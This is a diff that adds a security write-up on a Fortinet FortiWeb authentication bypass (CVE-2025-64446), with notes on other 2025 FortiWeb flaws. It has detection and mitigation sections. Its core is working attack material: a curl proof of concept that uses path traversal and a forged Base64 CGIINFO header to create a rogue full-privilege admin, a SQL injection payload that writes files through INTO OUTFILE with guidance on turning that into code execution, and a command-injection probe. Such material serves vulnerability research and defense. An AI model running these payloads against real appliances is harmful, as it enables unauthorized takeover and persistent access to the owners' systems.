@@ -1,0 +1,149 @@
+# Fortinet FortiWeb — Auth bypass via API-prefix traversal and CGIINFO impersonation
+
+## Overview
+
+Fortinet FortiWeb exposes a centralized CGI dispatcher at `/cgi-bin/fwbcgi`. A two-bug chain allows an unauthenticated remote attacker to:
+- Reach `fwbcgi` by starting the URL with a valid API prefix and traversing directories.
+- Impersonate any user (including the built-in `admin`) by supplying a special HTTP header that the CGI trusts as identity.
+
+Vendor advisory: FG‑IR‑25‑910 (CVE‑2025‑64446). Exploitation has been observed in the wild to create persistent admin users.
+
+Impacted versions (as publicly documented):
+- 8.0 < 8.0.2
+- 7.6 < 7.6.5
+- 7.4 < 7.4.10
+- 7.2 < 7.2.12
+- 7.0 < 7.0.12
+- 6.4 ≤ 6.4.3
+- 6.3 ≤ 6.3.23
+
+FortiWeb 8.0.2 returns HTTP 403 for the traversal probe below.
+
+## Quick vulnerability probe
+
+- Path traversal from API prefix to `fwbcgi`:
+
+```http
+GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
+Host: <target>
+```
+
+- Interpretation: HTTP 200 → likely vulnerable; HTTP 403 → patched.
+
+## Root cause chain
+
+1) API-prefix path traversal to internal CGI
+- Any request path that begins with a valid FortiWeb API prefix (e.g., `/api/v2.0/cmdb/` or `/api/v2.0/cmd/`) can traverse with `../` to `/cgi-bin/fwbcgi`.
+
+2) Minimal-body validation bypass
+- Once `fwbcgi` is reached, a first gate performs a permissive JSON check keyed by a per-path file under `/var/log/inputcheck/`. If the file is absent, the check passes immediately. If present, the body only needs to be valid JSON. Use `{}` as a minimal compliant body.
+
+3) Header-driven user impersonation
+- The program reads the CGI environment variable `HTTP_CGIINFO` (derived from the HTTP header `CGIINFO`), Base64-decodes it, parses JSON, and copies attributes directly into the login context, setting the domain/VDOM. Keys of interest:
+  - `username`, `loginname`, `vdom`, `profname`
+- Example JSON to impersonate the built-in admin:
+
+```json
+{
+  "username": "admin",
+  "profname": "prof_admin",
+  "vdom": "root",
+  "loginname": "admin"
+}
+```
+
+Base64 of the above (as used in-the-wild):
+
+```
+eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
+```
+
+## End-to-end abuse pattern (unauthenticated → admin)
+
+1) Reach `/cgi-bin/fwbcgi` via an API-prefix traversal.
+2) Provide any valid JSON body (e.g., `{}`) to satisfy the input check.
+3) Send header `CGIINFO: <base64(json)>` where the JSON defines the target identity.
+4) POST the backend JSON expected by `fwbcgi` to perform privileged actions (e.g., create an admin user for persistence).
+
+### Minimal cURL PoC
+
+- Probe traversal exposure:
+
+```bash
+curl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
+```
+
+- Impersonate admin and create a new local admin user:
+
+```bash
+# Base64(JSON) for admin impersonation
+B64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='
+
+curl -ik \
+  -H "CGIINFO: $B64" \
+  -H 'Content-Type: application/json' \
+  -X POST \
+  --data '{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","type":"local-user","type_val":"0","password":"P@ssw0rd!"}}' \
+  'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
+```
+
+Notes:
+- Any valid JSON body suffices (e.g., `{}`) if `/var/log/inputcheck/<path>.json` does not exist.
+- The action schema is FortiWeb-internal; the example above adds a local admin with full privileges.
+
+## Other FortiWeb 2025 vulnerabilities worth checking quickly
+
+### Pre-auth Fabric Connector SQLi → RCE (CVE-2025-25257)
+- Affects 7.6.0–7.6.3, 7.4.0–7.4.7, 7.2.0–7.2.10, 7.0.0–7.0.10. Fixed in 7.6.4 / 7.4.8 / 7.2.11 / 7.0.11.
+- Bug: `get_fabric_user_by_token()` uses the `Authorization: Bearer <token>` value directly in a SQL query. Attacker supplies SQL that runs as MySQL user and can drop files via `SELECT ... INTO OUTFILE`, yielding code exec (webshell/`.pth` loader).
+- Typical attack surface: `/api/fabric/device/status` (and other Fabric Connector endpoints) over HTTP/HTTPS on the management plane.
+- Rapid test for SQLi:
+
+```bash
+curl -sk -X POST \
+  -H "Authorization: Bearer ' UNION SELECT NULL,NULL,NULL,NULL INTO OUTFILE '/data/var/tmp/pwn.txt' -- -" \
+  https://<host>/api/fabric/device/status
+```
+
+- Weaponization: write a `.pth` into FortiWeb's Python site-packages that imports `os;os.system(...)` on interpreter start, or drop a CGI under the webroot. Reloading services will execute the payload.
+- Hunting clues: Authorization headers containing quotes/UNION/SELECT; unexpected files under `/data/lib/python*/site-packages/` or `/data/var/waf/html/ROOT/cgi-bin/`.
+
+### FortiCloud SSO signature bypass (CVE-2025-59719)
+- Improper SAML signature verification lets an attacker forge FortiCloud SSO responses and log in as admin with no credentials.
+- Only exploitable when **FortiCloud SSO login** is enabled (it turns on automatically if the appliance was registered via GUI unless the checkbox was unticked).
+- Affected (per PSIRT): 8.0.0, 7.6.0–7.6.4, 7.4.0–7.4.9. Patched in 8.0.1 / 7.6.5 / 7.4.10.
+
+### OS command injection in management plane (CVE-2025-58034)
+- Affected: 7.0.0–7.0.11, 7.2.0–7.2.11, 7.4.0–7.4.10, 7.6.0–7.6.5, 8.0.0–8.0.1. Fixed in 7.0.12 / 7.2.12 / 7.4.11 / 7.6.6 / 8.0.2.
+- Practical probe (non-destructive): send a parameter containing ``;id;`` to management HTTP endpoints and watch for 500 responses with command output; block or patch immediately if any echo is seen.
+
+## Detection
+
+- Requests reaching `/cgi-bin/fwbcgi` via API-prefix paths containing `../` (e.g., `/api/v2.0/cmdb/.../../../../../../cgi-bin/fwbcgi`).
+- Presence of header `CGIINFO` with Base64 JSON containing keys `username`/`loginname`/`vdom`/`profname`.
+- Fabric Connector SQLi: Authorization headers containing SQL metacharacters, sudden files in Python site-packages/CGI dirs, hits to `/api/fabric/device/status` from internet IPs.
+- FortiCloud SSO: unexpected SAML issuers or audience values in `/var/log/ssod`.
+- Backend artifacts:
+  - Per-path files under `/var/log/inputcheck/` (gate configuration).
+  - Unexpected admin creation and configuration changes.
+- Rapid validation: the traversal probe returning 200 (exposed) vs 403 (blocked in fixed builds).
+
+## Mitigation
+
+- Upgrade to fixed releases (examples: 8.0.2, 7.6.5, 7.4.10, 7.2.12, 7.0.12) per vendor advisory.
+- Patch the other 2025 flaws: SQLi (7.6.4/7.4.8/7.2.11/7.0.11), SSO bypass (8.0.1/7.6.5/7.4.10), command injection (7.6.6/7.4.11/7.2.12/7.0.12/8.0.2).
+- Until patched:
+  - Do not expose FortiWeb management plane to untrusted networks.
+  - Add reverse-proxy/WAF rules to block:
+    - Paths that start with `/api/` and contain `../cgi-bin/fwbcgi`.
+    - Requests carrying a `CGIINFO` header.
+    - Fabric Connector calls with SQL metacharacters in `Authorization`.
+    - SAML endpoints from the internet if FortiCloud SSO is unused.
+  - Monitor and alert on the detection indicators above.
+
+## References
+
+- [When the impersonation function gets used to impersonate users — Fortinet FortiWeb auth bypass (watchTowr Labs)](https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/)
+- [watchTowr vs FortiWeb Auth Bypass — Detection artefact generator](https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass)
+- [CVE-2025-25257 — Fabric Connector pre-auth SQLi PoC](https://github.com/mrmtwoj/CVE-2025-25257)
+- [FortiCloud SSO signature bypass overview (CVE-2025-59719)](https://cyberpress.org/fortios-fortiweb-fortiproxy-flaw-allows-attackers-to-bypass-forticloud-sso/)
